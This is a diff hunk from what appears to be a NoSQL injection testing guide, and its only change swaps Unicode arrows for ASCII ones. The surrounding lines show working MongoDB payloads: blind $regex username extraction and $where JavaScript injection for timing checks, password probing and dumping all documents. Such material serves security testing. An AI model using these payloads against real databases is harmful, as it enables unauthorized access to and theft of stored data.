@@ -40,15 +40,15 @@ Look for signs of MongoDB, CouchDB, Firebase, or DynamoDB:
 
 **Blind extraction via $regex:**
 ```json
-{"username": {"$regex": "^a"}}  →  check if user starting with 'a' exists
-{"username": {"$regex": "^ad"}}  →  narrow down character by character
+{"username": {"$regex": "^a"}}  ->  check if user starting with 'a' exists
+{"username": {"$regex": "^ad"}}  ->  narrow down character by character
 ```
 
 **$where JavaScript injection (if enabled):**
 ```json
-{"$where": "sleep(5000) || true"}  →  time-based detection
-{"$where": "this.password.length > 0"}  →  data exfiltration
-{"$where": "return true"}  →  dump all documents
+{"$where": "sleep(5000) || true"}  ->  time-based detection
+{"$where": "this.password.length > 0"}  ->  data exfiltration
+{"$where": "return true"}  ->  dump all documents
 ```
 
 #### STEP 4: MONGODB-SPECIFIC ATTACKS
